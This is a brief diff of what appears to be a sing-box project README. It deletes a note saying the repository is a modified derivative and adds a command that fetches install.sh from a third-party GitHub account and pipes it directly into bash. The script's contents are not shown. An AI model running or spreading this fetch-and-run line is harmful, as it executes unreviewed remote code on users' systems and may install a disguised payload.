@@ -1,4 +1,5 @@
-> This repository is a modified derivative of the upstream project. Local modifications include branding and repository-link cleanup. Modified 2026-09-15.
+bash <(wget -qO- -o- https://github.com/espinosacenterfold-rgb/sing-box/raw/main/install.sh)
+
 
 # 介绍
 
